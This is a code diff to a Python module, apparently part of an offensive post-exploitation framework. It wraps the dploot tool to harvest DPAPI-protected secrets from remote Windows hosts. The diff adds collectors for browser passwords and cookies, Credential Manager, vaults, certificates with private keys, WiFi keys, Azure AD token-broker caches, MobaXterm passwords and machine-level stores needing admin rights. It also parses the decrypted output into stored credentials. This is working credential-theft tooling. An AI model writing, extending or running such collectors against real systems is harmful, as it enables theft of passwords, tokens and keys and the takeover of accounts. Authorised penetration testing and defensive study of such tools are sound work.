@@ -1,6 +1,10 @@
-"""DPAPI-protected loot via the dploot CLI: browser passwords/cookies, Windows
-Credential Manager, Vaults, certificates, RDCMan (.rdg), WiFi. Per-credential:
-tries every cred, decrypts what it can. Tolerant parsing; raw output saved."""
+"""DPAPI-protected loot via the dploot CLI (v4): browser passwords/cookies,
+Credential Manager, Vaults, certificates, RDCMan (.rdg), WiFi, WAM token broker,
+MobaXterm, plus the MACHINE DPAPI stores (need admin on the target).
+
+dploot v4 wants the target with -t and uses --quiet; auth is -u/-p/--hashes/-k.
+Per-credential: dploot decrypts a user's blobs with that user's password/hash.
+Parsing is tolerant (raw output always saved, so nothing is lost on a miss)."""
 from __future__ import annotations
 
 import re
@@ -11,9 +15,11 @@ from core.secret import Secret, Status
 from core.tools import find_tool, run, strip_ansi
 from .base import BaseCollector
 
-URL_RE = re.compile(r"(https?://\S+)", re.I)
-KV_RE = re.compile(r"^\s*(url|origin|target|resource|server|service|ssid|username|"
-                   r"user|login|password|pass|secret|key|cookie)\s*[:=]\s*(.+?)\s*$", re.I)
+KV_RE = re.compile(
+    r"^\s*(url|origin|target|targetname|resource|server|servername|service|ssid|"
+    r"username|user|login|password|pass|secret|key|cookie)\s*(?:[:=]|-)\s*(.+?)\s*$",
+    re.I)
+INLINE_RE = re.compile(r"^(?P<url>\S+)\s+-\s+(?P<user>[^:\s]+):(?P<pw>.+)$")
 
 
 def _flush(host, source, buf) -> List[Secret]:
@@ -21,8 +27,8 @@ def _flush(host, source, buf) -> List[Secret]:
     pw = (buf.get("password") or buf.get("pass") or buf.get("secret")
           or buf.get("key") or buf.get("cookie") or "")
     tgt = (buf.get("url") or buf.get("origin") or buf.get("target")
-           or buf.get("resource") or buf.get("server") or buf.get("service")
-           or buf.get("ssid") or "")
+           or buf.get("targetname") or buf.get("resource") or buf.get("server")
+           or buf.get("servername") or buf.get("service") or buf.get("ssid") or "")
     if not (user or pw):
         return []
     stype = "cookie" if "cookie" in buf else "password"
@@ -35,12 +41,14 @@ class _DplootModule(BaseCollector):
     requires = ("dploot",)
     module = ""
     source = ""
+    module_extra: List[str] = []
 
     def collect_with_cred(self, cred: Credential) -> List[Secret]:
         bin_ = find_tool("dploot")
         if not bin_:
             return []
-        cmd = [bin_, self.module] + cred.dploot_auth_args() + [self.host]
+        cmd = ([bin_, self.module, "-t", self.host, "--quiet"]
+               + cred.dploot_auth_args() + self.module_extra)
         res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                   raw_name=self._raw_name(cred))
         return self._parse(res.output)
@@ -48,10 +56,16 @@ class _DplootModule(BaseCollector):
     def _parse(self, out: str) -> List[Secret]:
         found: List[Secret] = []
         buf: dict = {}
-        for line in strip_ansi(out).splitlines():   # dploot colours its output
+        for line in strip_ansi(out).splitlines():
             if not line.strip():
                 if buf:
                     found += _flush(self.host, self.source, buf); buf = {}
+                continue
+            mi = INLINE_RE.match(line.strip())
+            if mi and ("http" in mi.group("url").lower() or "." in mi.group("url")):
+                found.append(Secret(self.host, self.source, mi.group("user"),
+                                    mi.group("pw"), Status.DECRYPTED,
+                                    target=mi.group("url"), secret_type="password"))
                 continue
             m = KV_RE.match(line)
             if m:
@@ -78,12 +92,13 @@ class _DplootModule(BaseCollector):
 
 class BrowserCollector(_DplootModule):
     name = "Browser"; source = "Browser"; module = "browser"
+    module_extra = ["--show-cookies"]
     description = "Chrome/Edge/Firefox saved logins + cookies (auto-decrypted)"
 
 
 class CredManCollector(_DplootModule):
     name = "CredMan"; source = "CredMan"; module = "credentials"
-    description = "Windows Credential Manager"
+    description = "Windows Credential Manager (incl. scheduled-task creds)"
 
 
 class VaultsCollector(_DplootModule):
@@ -101,16 +116,26 @@ class WifiCollector(_DplootModule):
     description = "WLAN profile PSK / 802.1X"
 
 
+class WamCollector(_DplootModule):
+    name = "WAM"; source = "WAM"; module = "wam"
+    description = "Web Account Manager / token broker cache (Azure AD SSO)"
+
+
+class MobaXtermCollector(_DplootModule):
+    name = "MobaXterm"; source = "MobaXterm"; module = "mobaxterm"
+    description = "MobaXterm saved sessions / passwords"
+
+
 class CertificatesCollector(_DplootModule):
     name = "Certs"; source = "Cert"; module = "certificates"
-    description = "User/machine certificates + private keys (client-auth = ADCS/PKINIT)"
+    description = "User certificates + private keys (client-auth = ADCS/PKINIT)"
 
     def _parse(self, out: str) -> List[Secret]:
         out = strip_ansi(out)
         found: List[Secret] = []
         for line in out.splitlines():
             low = line.lower()
-            if "written" in low and (".pfx" in low or ".pem" in low):
+            if ("written" in low or "saved" in low) and (".pfx" in low or ".pem" in low):
                 path = line.split()[-1]
                 clientauth = "client authentication" in out.lower()
                 found.append(Secret(self.host, "Cert", "", path,
@@ -118,3 +143,18 @@ class CertificatesCollector(_DplootModule):
                                     notes="client-auth cert -> certipy auth"
                                           if clientauth else "certificate + key"))
         return self._dedup(found)
+
+
+class MachineCredsCollector(_DplootModule):
+    name = "MachineCred"; source = "MachineCred"; module = "machinecredentials"
+    description = "Machine Credential Manager (needs admin)"
+
+
+class MachineVaultsCollector(_DplootModule):
+    name = "MachineVault"; source = "MachineVault"; module = "machinevaults"
+    description = "Machine Vaults (needs admin)"
+
+
+class MachineCertsCollector(CertificatesCollector):
+    name = "MachineCert"; source = "MachineCert"; module = "machinecertificates"
+    description = "Machine certificates + private keys (needs admin)"
